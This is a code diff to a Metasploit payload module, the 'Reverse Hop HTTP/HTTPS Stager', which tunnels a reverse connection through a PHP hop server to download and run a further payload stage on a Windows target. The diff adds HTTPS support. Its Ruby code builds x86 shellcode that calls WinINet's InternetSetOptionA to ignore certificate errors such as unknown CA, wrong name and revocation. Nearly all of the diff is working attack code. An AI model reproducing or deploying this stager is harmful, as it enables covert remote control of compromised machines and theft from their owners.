@@ -16,13 +16,14 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'           => 'Reverse Hop HTTP Stager',
+      'Name'           => 'Reverse Hop HTTP/HTTPS Stager',
       'Description'    => %q{
-        Tunnel communication over an HTTP hop point. Note that you must first upload
+        Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload
         data/hop/hop.php to the PHP server you wish to use as a hop.
       },
       'Author'         => [
          'scriptjunkie <scriptjunkie[at]scriptjunkie.us>',
+         'bannedit',
          'hdm'
         ],
       'License'        => MSF_LICENSE,
@@ -46,6 +47,15 @@ module Metasploit3
   #
   def stage_over_connection?
     false
+  end
+
+  #
+  # Generate the transport-specific configuration
+  #
+  def transport_config(opts={})
+    config = transport_config_reverse_http(opts)
+    config[:scheme] = URI(datastore['HOPURL']).scheme
+    config
   end
 
   #
@@ -188,12 +198,24 @@ httpopenrequest:
   pop ecx
   xor edx, edx           ; NULL
   push edx               ; dwContext (NULL)
-  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
-    ;0x80000000 |        ; INTERNET_FLAG_RELOAD
-    ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
-    ;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
-    ;0x00000200 |        ; INTERNET_FLAG_NO_UI
-    ;0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
+EOS
+
+    if uri.scheme == 'http'
+      payload_data << '  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
+    else
+      payload_data << '  push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
+    end
+    # 0x80000000 |        ; INTERNET_FLAG_RELOAD
+    # 0x00800000 |        ; INTERNET_FLAG_SECURE
+    # 0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+    # 0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+    # 0x80000000 |        ; INTERNET_FLAG_RELOAD
+    # 0x04000000 |        ; INTERNET_NO_CACHE_WRITE
+    # 0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
+    # 0x00000200 |        ; INTERNET_FLAG_NO_UI
+    # 0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
+    payload_data << <<EOS
+
   push edx               ; accept types
   push edx               ; referrer
   push edx               ; version
@@ -223,6 +245,28 @@ httpsendrequest:
 try_it_again:
   dec ebx
   jz failure
+
+EOS
+    if uri.scheme == 'https'
+      payload_data << <<EOS
+set_security_options:
+  push 0x00003380
+    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
+    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
+    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
+  mov eax, esp
+  push 0x04                 ; sizeof(dwFlags)
+  push eax               ; &dwFlags
+  push 0x1f              ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+  push esi               ; hRequest
+  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+  call ebp
+
+EOS
+  end
+  payload_data << <<EOS
   jmp.i8 httpsendrequest
 
 dbl_get_server_host:
